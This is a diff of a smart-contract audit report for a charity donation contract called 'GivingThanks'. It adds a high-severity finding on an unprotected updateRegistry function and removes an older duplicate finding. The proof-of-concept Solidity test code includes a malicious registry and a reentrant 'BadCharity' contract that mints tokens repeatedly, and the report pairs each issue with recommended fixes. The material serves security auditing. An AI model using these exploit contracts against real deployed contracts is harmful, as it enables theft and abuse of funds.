@@ -1,10 +1,126 @@
 # Giving Thanks Report
 
-## High
+# High
 
-## Medium
+# [H-1] Denial of Service and Reentrancy after `GivingThanks:updateRegistry`
 
-## [M-1] wrong verification at `CharityRegistry:isVerified` function
+**Description:** `GivingThanks:updateRegistry` allows any attacker to take control over the `Registry` , so in combination with `GivingThanks:donate`, the attacker will deny, charge with higher gas for legit `Charities` or bypass `Bad Charities` through `isVerified`. Therefore, allowing `Malicious Contracts` to reenter `donations` again and again.
+
+```javascript
+@>   function updateRegistry(address _registry) public {
+        //public nor even protected
+        registry = CharityRegistry(_registry);
+    }
+```
+
+**Impact:** legit `Charities` might be denied and reentrancies are allowed to exploit minting mechanism or alter `tokenCounter` order.
+
+**Proof of concept:**
+
+1. **Scenario 1: DOS**
+   1. **attacker**: creates a `Malicious Register`.
+   2. **attacker**: updates `GivingThanks:Registry`,
+   3. **donor**: calls `donate`.
+   4. **Malicious Register**: charge with higher gas or deny `isVerified` condition.
+   5. **Charity**: receives donation or not.
+
+```javascript
+    contract RegistryDOS {
+        function isVerified(address) public pure returns (bool) {
+            //DOS or high-gas computation
+            return false;
+        }
+    }
+
+    function testRegistryUpdateDOS() public {
+        RegistryDOS badRegistry = new RegistryDOS();
+        charityContract.updateRegistry(address(badRegistry));
+        vm.deal(donor, 10 ether);
+        vm.prank(donor);
+        vm.expectRevert(bytes("Charity not verified"));
+        charityContract.donate{ value: 1 ether }(charity);
+    }
+
+```
+
+2. **Scenario 2: Reentrancy and Minting**
+   1. **attacker**: creates a `Malicious Register` and `Maliciuos Charity`.
+   2. **attacker**: updates `GivingThanks:Registry` ,
+   3. **attacker**: calls `donate` to `Maliciuos Charity`.
+   4. **Malicious Register**: bypassess `isVerified` condition.
+   5. **Maliciuos Charity**: receives donation then reenters `donate` to himself, mining `n` tokens desired.
+
+```javascript
+    contract BadCharity {
+        uint256 times;
+        GivingThanks protocol;
+
+        constructor(address _protocol) {
+            protocol = GivingThanks(_protocol);
+        }
+
+        fallback() external payable {
+            //desired times
+            if (times < 10) {
+                times = times + 1;
+                //will donate himself 0 but minting N times
+                protocol.donate{ value: 0 }(address(this));
+            }
+        }
+    }
+
+    function testRegistryUpdateReentrancy() public {
+        BadCharity badCharity = new BadCharity(address(charityContract));
+
+        RegistryBypasser badRegistry = new RegistryBypasser();
+        charityContract.updateRegistry(address(badRegistry));
+        //donor or attacker the bad charity will mint N tokens anyways
+        //also alters tokenCounter order
+        vm.deal(donor, 1 ether);
+        vm.prank(donor);
+        charityContract.donate{ value: 0 }(address(badCharity));
+    }
+```
+
+</details>
+
+**Recommended Mitigation:**
+
+1. Add owner requirement to proceed `Registry` update.
+2. protect `donate` with NonReentrant modifier.
+3. cache tokenCounter before transfer.
+
+```diff
+-    function donate(address charity) public payable {
++    function donate(address charity) public payable nonReentrant {
+        require(registry.isVerified(charity), "Charity not verified");
+        //@e to malicious charities will afect them not the protocol
++       uint256 tokenId = tokenCounter;
+        tokenCounter += 1;
+        (bool sent,) = charity.call{ value: msg.value }("");
+        require(sent, "Failed to send Ether");
+        //@audit unsafe token mint, ERC721Receiver
+-        _mint(msg.sender, tokenCounter);
++        _mint(msg.sender, tokenId);
+
+        // Create metadata for the tokenURI
+        string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
+-        _setTokenURI(tokenCounter, uri);
++        _setTokenURI(tokenId, uri);
+
+-       tokenCounter += 1;
+    }
+
+
+   function updateRegistry(address _registry) public {
++      require(msg.sender == owner);
+       registry = CharityRegistry(_registry);
+   }
+```
+
+# Medium
+
+# [M-1] wrong verification at `CharityRegistry:isVerified` function
 
 **Description:** `CharityRegistry:isVerified` function uses `registeredCharities` instead of `verifiedCharities` to properly determine `Charities` verification.
 
@@ -74,58 +190,6 @@
 **Recommended Mitigation:**
 
 - use `_safeMint` instead for contract donors.
-
-# [M-3] Anyone can change `GivingThanks:CharityRegistry`
-
-**Description:** lack of protection by `GivingThanks:updateRegistry`, allows anyone to update it.
-
-```javascript
-    function updateRegistry(address _registry) public {
-        registry = CharityRegistry(_registry);
-    }
-```
-
-**Impact:** Allows to be used any address or contract as `CharityRegistry`, that eventually breaks or bypasses any dependency such `registry.isVerified`.
-
-**Proof of Concept:**
-
-- _user_: creates a `bad Register`.
-- _user_: creates `bad charity` may register or not (does not matter).
-- _user_: updates `GivingThanks:Registry`,
-- _donor_: donates somehow to badCharity.
-- _badRegister_: bypasses any verification.
-- _badCharity_: receives donation.
-
-```javascript
-
-    contract BadRegistry {
-        function isVerified(address) public pure returns (bool) {
-            return true;
-        }
-    }
-
-    function testAnyoneCanUpdateRegistry() public {
-        address badCharity = makeAddr("badCharity");
-        BadRegistry badRegistry = new BadRegistry();
-        charityContract.updateRegistry(address(badRegistry));
-        registryContract.registerCharity(badCharity);
-        vm.deal(donor, 10 ether);
-        vm.prank(donor);
-        charityContract.donate{ value: 1 ether }(badCharity);
-        assertEq(badCharity.balance, 1 ether);
-    }
-```
-
-**Recommended Mitigation:**
-
-Add owner requirement to proceed `Registry` update.
-
-```diff
-    function updateRegistry(address _registry) public {
-+       require(msg.sender == owner);
-        registry = CharityRegistry(_registry);
-    }
-```
 
 # Low
 
